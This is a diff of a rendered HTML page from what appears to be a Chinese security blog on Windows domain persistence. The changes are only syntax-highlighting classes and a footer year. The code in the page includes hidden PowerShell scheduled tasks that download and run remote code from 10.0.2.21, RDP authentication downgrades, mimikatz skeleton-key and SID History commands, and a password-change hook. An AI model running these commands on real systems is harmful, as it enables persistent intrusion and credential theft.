@@ -251,7 +251,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">REG</span> <span class="n">ADD</span> <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="n">UserAuthentication</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">0</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">REG</span> <span class="n">ADD</span> <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="n">UserAuthentication</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="mf">0</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>用户鉴权即 userauthentication 这个参数的作用：</p>
@@ -273,7 +273,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">REG</span> <span class="n">ADD</span> <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="n">SecurityLayer</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">0</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">REG</span> <span class="n">ADD</span> <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="n">SecurityLayer</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="mf">0</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>0 就是连接前使用 RDP 协议进行身份验证，RDP 即远程桌面连接，可以简单理解为就是关闭验证。1 是指在连接前两端协商来进行身份验证，这个是默认值。2 就是使用 tls 协议来进行。来看下 0 和 1 的区别：</p>
@@ -344,7 +344,7 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># schtasks 命令</span>
 </span></span><span class="line"><span class="cl"><span class="c"># 每天晚上 03:30 定时执行</span>
-</span></span><span class="line"><span class="cl"><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="s2">&#34;TimedTask1&#34;</span> <span class="p">/</span><span class="n">tr</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">TimedTask</span><span class="p">\</span><span class="n">Run</span><span class="p">.</span><span class="n">bat</span> <span class="p">/</span><span class="nb">sc </span><span class="n">DAILY</span> <span class="p">/</span><span class="n">st</span> <span class="n">03</span><span class="err">:</span><span class="n">30</span> 
+</span></span><span class="line"><span class="cl"><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="s2">&#34;TimedTask1&#34;</span> <span class="p">/</span><span class="n">tr</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">TimedTask</span><span class="p">\</span><span class="n">Run</span><span class="p">.</span><span class="py">bat</span> <span class="p">/</span><span class="nb">sc </span><span class="n">DAILY</span> <span class="p">/</span><span class="n">st</span> <span class="mf">03</span><span class="err">:</span><span class="mf">30</span> 
 </span></span><span class="line"><span class="cl"><span class="c"># statement A</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c"># 查询创建的任务</span>
@@ -379,7 +379,7 @@
 </span></span><span class="line"><span class="cl"><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="n">PentestLab</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> <span class="p">/</span><span class="nb">sc </span><span class="n">onstart</span> <span class="p">/</span><span class="n">ru</span> <span class="n">System</span>
 </span></span><span class="line"><span class="cl"> 
 </span></span><span class="line"><span class="cl"><span class="c">#(X64) - On User Idle (30mins)</span>
-</span></span><span class="line"><span class="cl"><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="n">PentestLab</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> <span class="p">/</span><span class="nb">sc </span><span class="n">onidle</span> <span class="p">/</span><span class="n">i</span> <span class="n">30</span>
+</span></span><span class="line"><span class="cl"><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="n">PentestLab</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> <span class="p">/</span><span class="nb">sc </span><span class="n">onidle</span> <span class="p">/</span><span class="n">i</span> <span class="mf">30</span>
 </span></span><span class="line"><span class="cl"> 
 </span></span><span class="line"><span class="cl"><span class="c">#(X86) - On User Login</span>
 </span></span><span class="line"><span class="cl"><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="n">PentestLab</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> <span class="p">/</span><span class="nb">sc </span><span class="n">onlogon</span> <span class="p">/</span><span class="n">ru</span> <span class="n">System</span>
@@ -388,7 +388,7 @@
 </span></span><span class="line"><span class="cl"><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="n">PentestLab</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> <span class="p">/</span><span class="nb">sc </span><span class="n">onstart</span> <span class="p">/</span><span class="n">ru</span> <span class="n">System</span>
 </span></span><span class="line"><span class="cl">  
 </span></span><span class="line"><span class="cl"><span class="c">#(X86) - On User Idle (30mins)</span>
-</span></span><span class="line"><span class="cl"><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="n">PentestLab</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> <span class="p">/</span><span class="nb">sc </span><span class="n">onidle</span> <span class="p">/</span><span class="n">i</span> <span class="n">30</span>
+</span></span><span class="line"><span class="cl"><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="n">PentestLab</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> <span class="p">/</span><span class="nb">sc </span><span class="n">onidle</span> <span class="p">/</span><span class="n">i</span> <span class="mf">30</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="14-wmi-无文件后门">1.4 wmi 无文件后门</h3>
@@ -689,7 +689,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-ItemProperty</span> <span class="s2">&#34;hklm:\system\currentcontrolset\control\lsa\&#34;</span> <span class="n">-name</span> <span class="s2">&#34;dsrmadminlogonbehavior&#34;</span> <span class="n">-value</span> <span class="n">2</span> <span class="n">-propertyType</span> <span class="n">DWORD</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-ItemProperty</span> <span class="s2">&#34;hklm:\system\currentcontrolset\control\lsa\&#34;</span> <span class="n">-name</span> <span class="s2">&#34;dsrmadminlogonbehavior&#34;</span> <span class="n">-value</span> <span class="mf">2</span> <span class="n">-propertyType</span> <span class="n">DWORD</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><ol start="4">
@@ -744,8 +744,8 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">net</span> <span class="n">use</span> <span class="p">\\</span><span class="n">dc</span><span class="p">.</span><span class="n">pentest</span><span class="p">.</span><span class="n">domain</span> <span class="n">mimikatz</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">administrator</span><span class="nv">@pentest</span><span class="p">.</span><span class="n">domain</span>
-</span></span><span class="line"><span class="cl"><span class="nb">dir </span><span class="p">\\</span><span class="n">DC</span><span class="p">.</span><span class="n">pentest</span><span class="p">.</span><span class="n">domain</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">net</span> <span class="n">use</span> <span class="p">\\</span><span class="n">dc</span><span class="p">.</span><span class="py">pentest</span><span class="p">.</span><span class="py">domain</span> <span class="n">mimikatz</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">administrator</span><span class="nv">@pentest</span><span class="p">.</span><span class="py">domain</span>
+</span></span><span class="line"><span class="cl"><span class="nb">dir </span><span class="p">\\</span><span class="n">DC</span><span class="p">.</span><span class="py">pentest</span><span class="p">.</span><span class="n">domain</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
@@ -829,7 +829,7 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
 </span></span><span class="line"><span class="cl"><span class="p">!+</span>
-</span></span><span class="line"><span class="cl"><span class="p">!</span><span class="n">processprotect</span> <span class="p">/</span><span class="k">process</span><span class="err">:</span><span class="n">lsass</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">remove</span>
+</span></span><span class="line"><span class="cl"><span class="p">!</span><span class="n">processprotect</span> <span class="p">/</span><span class="k">process</span><span class="err">:</span><span class="n">lsass</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">remove</span>
 </span></span><span class="line"><span class="cl"><span class="n">misc</span><span class="p">::</span><span class="n">skeleton</span>
 </span></span></code></pre></td></tr></table>
 </div>
@@ -889,7 +889,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">copy </span><span class="n">mimilib</span><span class="p">.</span><span class="n">dll</span> <span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">copy </span><span class="n">mimilib</span><span class="p">.</span><span class="py">dll</span> <span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><blockquote>
@@ -932,7 +932,7 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sid::patch&#34;</span> <span class="s2">&#34;sid::add /new:administrator /sam:test&#34;</span> <span class="s2">&#34;exit&#34;</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sid::patch&#34;</span> <span class="s2">&#34;sid::add /new:administrator /sam:test&#34;</span> <span class="s2">&#34;exit&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="c"># 将 administrator 的 SID 添加到 hack 的 SID History 属性中</span>
 </span></span></code></pre></td></tr></table>
 </div>
@@ -953,7 +953,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sid::patch&#34;</span> <span class="s2">&#34;sid::clear /sam:test&#34;</span> <span class="s2">&#34;exit&#34;</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sid::patch&#34;</span> <span class="s2">&#34;sid::clear /sam:test&#34;</span> <span class="s2">&#34;exit&#34;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="25-hook-passwordchangenotify">2.5 Hook PasswordChangeNotify</h3>
@@ -990,7 +990,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">PowerShell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="o">-File</span> <span class="n">HookPasswordChangeNotify</span><span class="p">.</span><span class="n">ps1</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">PowerShell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="o">-File</span> <span class="n">HookPasswordChangeNotify</span><span class="p">.</span><span class="py">ps1</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>在 Server 2012 R2 x64 下，手动修改域控密码后
@@ -1023,7 +1023,7 @@
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
